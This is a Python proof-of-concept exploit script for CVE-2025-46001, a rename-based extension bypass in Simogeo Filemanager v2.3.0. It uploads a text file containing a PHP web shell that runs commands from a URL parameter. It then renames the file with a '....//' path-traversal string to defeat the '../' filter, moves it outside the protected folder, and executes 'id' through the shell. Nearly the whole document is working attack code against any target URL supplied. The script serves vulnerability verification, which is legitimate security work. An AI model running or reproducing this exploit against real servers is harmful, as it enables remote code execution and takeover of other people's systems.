#!/usr/bin/env python3
"""
CVE-2025-46001 - Simogeo Filemanager v2.3.0 Rename-Based Extension Bypass

Vulnerability: The rename functionality lacks proper extension validation,
allowing attackers to rename uploaded files (e.g., shell.txt -> shell.php)
to execute disallowed file types.

Path Traversal Bypass: Using "....//shell.php" as new filename bypasses
the "../" filter (....// -> ../ after filter) to move file outside userfiles.

Reference:
- https://github.com/zakumini/CVE-List/blob/main/CVE-2025-46001/CVE-2025-46001.md
- https://www.exploit-db.com/exploits/38895
"""
import requests
import sys
import random
import string
import urllib.parse

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def exploit(target_url):
    random_name = generate_random_string()
    txt_filename = f"shell_{random_name}.txt"
    php_filename = f"shell_{random_name}.php"
    php_code = '<?php echo "CVE-2025-46001-VULNERABLE"; if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
    
    base_url = f"{target_url}/connectors/php/filemanager.php"
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Step 1: Upload allowed file type (.txt) containing PHP code")
    
    files = {
        'newfile': (txt_filename, php_code, 'text/plain')
    }
    
    fm_path = target_url.split('/')[-1]
    currentpath = f"/{fm_path}/userfiles/"
    
    data = {
        'mode': 'add',
        'currentpath': currentpath
    }
    
    try:
        resp = requests.post(base_url, files=files, data=data, timeout=10)
        print(f"[*] Upload response: {resp.text}")
        
        if '"Code":0' not in resp.text and '"Code": 0' not in resp.text:
            print(f"[-] Upload failed")
            return False
            
        print(f"[+] Text file uploaded: {txt_filename}")
        
        print(f"[*] Step 2: Rename with path traversal to bypass .htaccess")
        print(f"[*]   Using '....//shell.php' -> filter removes '../' -> becomes '../shell.php'")
        
        old_path = f"{currentpath}{txt_filename}"
        traversal_name = f"....//....//shell_{random_name}.php"
        rename_url = f"{base_url}?mode=rename&old={urllib.parse.quote(old_path)}&new={traversal_name}"
        
        resp = requests.get(rename_url, timeout=10)
        print(f"[*] Rename response: {resp.text}")
        
        if '"Code":0' in resp.text or '"Code": 0' in resp.text:
            print(f"[+] Rename with path traversal succeeded!")
            
            shell_url = f"{target_url.rsplit('/', 1)[0]}/shell_{random_name}.php"
            print(f"[*] Step 3: Verify shell at: {shell_url}")
            
            verify_resp = requests.get(shell_url, timeout=10)
            
            if "CVE-2025-46001-VULNERABLE" in verify_resp.text:
                print(f"[+] VULNERABLE! RCE achieved via path traversal!")
                print(f"[+] Shell URL: {shell_url}")
                
                cmd_resp = requests.get(f"{shell_url}?cmd=id", timeout=10)
                print(f"[+] Command 'id' output:\n{cmd_resp.text}")
                return True
            elif verify_resp.status_code == 200:
                print(f"[-] File found but PHP not executed")
        
        print(f"[*] Step 2b: Try simple rename (without path traversal)")
        old_path = f"{currentpath}{txt_filename}"
        rename_url = f"{base_url}?mode=rename&old={urllib.parse.quote(old_path)}&new={php_filename}"
        
        resp = requests.get(rename_url, timeout=10)
        print(f"[*] Rename response: {resp.text}")
        
        if '"Code":0' in resp.text or '"Code": 0' in resp.text:
            print(f"[+] Extension bypass vulnerability confirmed!")
            print(f"[+] Successfully renamed .txt to .php (file: {php_filename})")
            print(f"[!] Note: .htaccess prevents execution, but vulnerability exists")
            return True
        else:
            print(f"[-] Rename blocked - may be patched")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
    
    return False

def main():
    if len(sys.argv) < 2:
        target_url = "http://localhost:8086/filemanager"
    else:
        target_url = sys.argv[1].rstrip('/')
    
    print("=" * 70)
    print("CVE-2025-46001 - Filemanager v2.3.0 Rename Extension Bypass PoC")
    print("=" * 70)
    
    if exploit(target_url):
        print("\n[+] Vulnerability confirmed!")
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
